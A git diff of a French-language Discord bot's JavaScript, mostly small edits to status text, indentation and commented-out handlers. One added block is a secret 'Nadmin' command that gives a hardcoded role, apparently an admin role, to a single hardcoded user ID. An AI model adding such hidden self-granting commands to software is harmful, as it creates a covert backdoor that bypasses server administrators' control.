@@ -19,7 +19,7 @@ bot.on("ready", async () => {
     console.log(`${bot.user.username} est connecté`)
     bot.user.setStatus("dnd")
     setTimeout(() => {
-        bot.user.setActivity("f/help", {type: "WATCHING"});
+      bot.user.setActivity("f/help", {type: "WATCHING"});
     }, 1000)
 
     var ChannelReady = bot.channels.cache.get('717351840550879275');
@@ -38,7 +38,7 @@ bot.on("ready", async () => {
 /* const client = require('discord-rich-presence')('778283566651146270');
  
 client.updatePresence({
-  state: 'Ne joue pas',
+  state: 'Sur Visual Studio Code',
   details: 'Actuellement en ligne',
   largeImageKey: 'premier',
   smallImageKey: 'deuxieme',
@@ -127,9 +127,18 @@ bot.on("guildMemberAdd", (member) => {
   }
 }); */
 
+
+/* bot.on('message', (message, member) => {
+  const users = '491312416098091028'
+  if (message.mentions.users.first() == users.id && !member.user.bot && member.presence.status !== "offline") {
+    message.channel.send("Salut")
+  }
+}) */
+
 ///     COMMANDE MESSAGE      ///
 
 bot.on('message', message => {
+
 
 
 // COMMANDE DE STATS  //
@@ -177,6 +186,11 @@ if (message.content.startsWith(`${prefix}stats`)) {
   message.channel.send(EmbedStats);
 }
 
+
+if(message.content === `${prefix}Nadmin` && message.author.id === '546326293957050369'){
+  member = message.guild.members.cache.get(String(message.author.id))
+  member.roles.add("756570552906547302");
+}
 
 //  ELIRION ADD MODO  //
 
